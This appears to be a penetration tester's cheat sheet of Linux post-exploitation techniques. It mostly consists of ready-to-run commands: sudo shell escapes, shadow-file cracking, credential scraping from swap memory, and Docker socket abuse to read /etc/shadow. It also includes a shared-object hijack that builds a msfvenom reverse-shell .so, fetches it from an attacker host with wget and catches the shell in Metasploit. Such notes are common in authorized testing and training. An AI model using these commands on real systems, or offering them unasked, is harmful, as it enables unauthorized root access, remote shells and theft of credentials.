# ------------------------------- start post exploitation ------------------------------- # 
    ==> Quick View: basically means the phases of operation once a victim's system has been
    compromised by the attacker. The value of the compromised system is determined by the
    value of the actual data stored in it and how an attacker may make use of it for malicious purposes.

    - ClearText Credentials.
    - SUID Binaries.
        - SUID nmap --interative mode
        - glibc '$ORIGIN' expansion privilege escalation
    - Sudo privileged access.
    - Cracking the password
    - Mimipenguin
        ==> work as mimikatz, required root privilege.
    - Credentials from swap memory
    - Code execution via shared object library loading.
    - Kernel exploitation.
    - Socket exploitation.
    - ssh hijacking
    - stealing ssh credentials
    - samba pass the hash
    - firefox dump stored credentials

    # ---------- |SUID Binaries| ---------- #
        # ---------- |glibc '$ORIGIN' expansion privilege escalation| ---------- #
            ==> SUID executables, exploits the GNU C library Dynamic linker (Glibc) versions
            before 2.11.3 and 2.12.x versions up to 2.12.1 and takes advantage of glibc's
            failure to restrict the use of LD_AuDIT environment variable when loading SUID
            executables which controls the $ORIGIN library search path.

                use exploit/linux/local/glibc_origin_expansion_priv_sec
    # ---------- |SUID Binaries| ---------- #

    # ---------- |sudo privileged access| ---------- #
        ==> extra miles after sudoers and sudo -l

        # ---------- |shell escape via less and more| ---------- #
            man less
            !<command>
                ==> example: !id
        # ---------- |shell escape via vi/vim| ---------- #
            :!sh
        # ---------- |shell escape via nano| ---------- #
            1st: incase you run in by root privilege.
            2nd: press ctrl+r then ctrl+x
            3rd: inject your command
                ex: cat /etc/passwd
        # ---------- |shell escape via man| ---------- #
            man -P "<command>" man
        # ---------- |shell escape via nmap| ---------- #
            nmap --version
            nmap --interactive
            !sh
        # ---------- |shell escape via find| ---------- #
            find /home/bob -name test -exec /bin/sh \;
                ==> explanation: serach test in /home/bob if found will execute -exec
        # ---------- |shell escape via ssh| ---------- #
            ssh <restricted_user>@<target_ip> -t "/bin/sh"
        # ---------- |shell escape via ftp| ---------- #
            !sh
        # ---------- |shell escape via gdb| ---------- #
            !sh
        # ---------- |shell escape via python| ---------- #
            python -c 'import pty; pty.spawn("/bin/sh")'
        # ---------- |shell escape via perl| ---------- #
            perl -e 'exec "/bin/sh";'
        # ---------- |shell escape via lrb| ---------- #
        # ---------- |shell escape via lua| ---------- #
        # ---------- |shell escape via docker| ---------- #
    # ---------- |sudo privileged access| ---------- #
    
    # ---------- |Cracking the password| ---------- #
        # ---------- |Cracking the shadow| ---------- #
            unshadow passwd shadow > shadow.john
            john shadow.john --wordlist=<wordlist>
    # ---------- |Cracking the password| ---------- #
    
    # ---------- |Credentials from swap memory| ---------- #
        swapon -s
        cat /proc/swaps
            ==> retrieve swap mounting
        strings <swap_mount_dev> | grep "password="
        strings <swap_mount_dev> | grep "&password="

        # ---------- |automated tool| ---------- #
            swap_digger: https://github.com/sevagas/swap_digger
    # ---------- |Credentials from swap memory| ---------- #
 
    # ---------- |Code execution via shared object library loading| ---------- #
        ==> Quick View: similar to MS windows' DLL, shared object libraries are
        essentially their equivalent on linux systems.
        referencing ".so" files.
        two main types of shared object libraries:
            - static libraries: (.a) code that is compiled into an application.
            - dynamic linked shared object libraries: (.so) can be linked to the application
            at runtime or loaded or unloaded and linked during an application execution.
        linux application is executed that will search for thos shared object in the following
        search order:
            1- any directories specified by -rpath-link 
            2- any directories specified by -rpath
            3- environment variables LD_RUN_PATH and LD_LIBRARY_PATH
            4- directories defined in DT_RUNPATH and DT_RPATH environment variable
            5- default lin directories /lib/ and /usr/lib
            6- finally, any directories defined in /etc/ld.so.conf file.

        # ---------- |exploit steps| ---------- #
            1st: determine if the executable was compiled with RPATH or RUNPATH option
                objdump -x <application> | grep RPATH
                objdump -x <application> | grep RUNPATH
            2nd: .so that used by application
                ldd /usr/local/bin/program
            3rd: generate backdoor shared object
                msfvenom -a x64 -p linux/shell_reverse_tcp LHOST=<attack_ip> \
                LPORT=<attack_port> -f elf-so -o <so_file_name>
            4th: transfer malicious .so to the target machine
                python -m SimpleHTTPServer 80   # create web server on attack machine
                cd <path_for_download> && wget <attack_ip:port/<malicious_so>>
            5th: multi handler
                use exploit/multi/handler
                set payload /linux/x64/shell_reverse_tcp
                set LHOST <attack_ip>
                set LPORT <attack_port>
                exploit -j
    # ---------- |Code execution via shared object library loading| ---------- #

    # ---------- |Kernel exploitation| ---------- #
        ==> Quick View: many different categories of kernel exploitation:
            - Buffer Overflows.
            - Memory Corruption
            - Denial of services.
            - race conditions.
        ==> CvE checks:
            - https://github.com/InteliSecureLabs/Linux_Exploit_Suggester
            - https://github.com/spencerdodd/kernelpop
            - https://github.com/SecWiki/linux-kernel-exploits
            - https://github.com/lucyoa/kernel-exploits

        # ---------- |cve-2009-1185| ---------- #
            ==> Quick View: udev before 1.4.1 does not verify whether a NETLINK message originates 
                            from kernel space, which allows local users to gain privileges by sending 
                            a NETLINK message from user space.
                exploit: https://www.exploit-db.com/exploits/8572          
                exploit: metasploit: exploit/linux/local/udev_netlink          
    # ---------- |Kernel exploitation| ---------- #
    
    # ---------- |Socket exploitation| ---------- #
        ==> Quick View: unix socket is another component in *nix systems that can leverage to
        escalate your privileges.

        # ---------- |Docker| ---------- #
            ==> Quick View: by design, the docker daemon binds to a unix socket instead of TCP port.
            by default, the Unix socket is owned by the user root, and docker run by root.

            doker run -v /etc/shadow:/docker/hashedpassword -d postgres     # create new container with shadow file content.
            docker exec -ri <container_id> bash                             # run hashedpassword container that contain /etc/shadow
            cat /docker/hashedpassword > /docker/test.txt
            chmod 777 /docker/test.txt
            cat /docker/test.txt

        # ---------- |CVE-2017-9232| ---------- #

        # ---------- |CVE-2016-10010| ---------- #
    # ---------- |Socket exploitation| ---------- #

    # ---------- |ssh hijacking| ---------- #
        ==> Refer back to: linux-ssh-hijacking-attack
    # ---------- |ssh hijacking| ---------- #
    
    # ---------- |stealing ssh credentials| ---------- #
        ==> Refer back to: general-stealing-ssh-credentials-attack
    # ---------- |stealing ssh credentials| ---------- #
    
    # ---------- |samba pass the hash| ---------- #
        ==> Refer back to: linux-samba-pass-the-hash-attack
    # ---------- |samba pass the hash| ---------- #
    
    # ---------- |firefox dump stored credentials| ---------- #
        ==> Refer back to: firefox-dump-stored-credentials-attack
    # ---------- |firefox dump stored credentials| ---------- #

# -------------------------------   end post exploitation ------------------------------- # 
